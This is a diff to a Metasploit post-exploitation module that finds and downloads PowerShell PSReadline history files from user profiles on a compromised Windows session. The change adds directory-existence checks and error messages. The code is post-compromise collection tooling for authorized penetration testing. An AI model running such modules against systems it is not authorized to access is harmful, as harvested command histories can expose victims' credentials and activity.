@@ -32,14 +32,53 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  #
+  # Check to see if the directory exists on the remote system.
+  #
+  def dir_exists(profile)
+    if profile['AppData'].nil?
+      print_error("PowerShell directory not found for #{profile['UserName']}")
+      return false
+    end
+
+    path = "#{profile['AppData']}\\Microsoft\\Windows"
+    dir = "PowerShell"
+    dirs = session.fs.dir.foreach(path).collect
+    if dirs.include? dir
+      path = "#{path}\\#{dir}"
+      dir = "PSReadline"
+      dirs = session.fs.dir.foreach(path).collect
+      if dirs.include? dir
+        return true
+      else
+        print_error("PSReadline directory not found for #{profile['UserName']}")
+        return false
+      end
+    else
+      print_error("PowerShell directory not found for #{profile['UserName']}")
+      return false
+    end
+  end
+
+  #
+  # Download the PSReadline history file if it exists.
+  #
   def gather_psreadline_history(profile)
     name = 'PSReadline'
     path = 'AppData'
+    if !dir_exists(profile)
+      return false
+    end
+    print_good("#{name} directory found #{profile['UserName']}")
+
     fname = "ConsoleHost_history.txt"
     file_path = "#{profile[path]}\\Microsoft\\Windows\\PowerShell\\PSReadline"
     files = session.fs.file.search(file_path, "#{fname}", true)
 
-    return false unless files
+    if files.size == 0
+      print_error("History file not found for #{profile['UserName']}")
+      return false
+    end
 
     files.each do |file|
       local_loc = "#{profile['UserName']}_#{name}_#{fname}"
